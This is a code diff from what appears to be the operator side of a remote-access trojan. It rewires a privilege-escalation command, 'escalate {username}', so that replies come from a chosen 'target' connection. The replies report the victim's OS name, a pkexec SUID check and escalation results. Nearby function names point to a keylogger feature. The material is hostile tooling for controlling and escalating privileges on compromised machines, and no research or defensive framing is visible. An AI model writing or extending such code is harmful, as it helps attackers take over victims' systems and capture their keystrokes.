@@ -134,7 +134,7 @@ def target_communication(target):
         
         # Privilege Escalation
         elif command[:8] == "escalate": # Run by `escalate {username}`
-            privilege_escalator(command[9:])
+            privilege_escalator(command[9:], target)
         
         # Others
         else:
@@ -243,25 +243,26 @@ def terminate_keylogger_terminal():
 # Feature 2: Privilege Escalation
 # ====================
 
-def privilege_escalator(user):
+def privilege_escalator(user, target):
     print(f"Escalating privileges of USER:{user} with pkexec...")
-    osname = reliable_recv()
+    osname = reliable_recv(target)
     print(f"This is OS NAME:{osname}")
     if osname == 'posix':
-        SUID = reliable_recv()
+        print(f'wait for SUID...')
+        SUID = reliable_recv(target)
         print(f"Result from checking SUID: {SUID}")
         if "Found" in SUID:
             print("Starting Escalation")
             while True:
-                check = reliable_recv()
+                check = reliable_recv(target)
                 print(check)
                 if check == "USER has already input PASS":
                     break
-            result = reliable_recv()
+            result = reliable_recv(target)
             print(result)
             privilege_escalation_banner()
         else:
-            print(reliable_recv())
+            print(reliable_recv(target))
     else:
         print("Escalation Failed B/C not posix system")
 
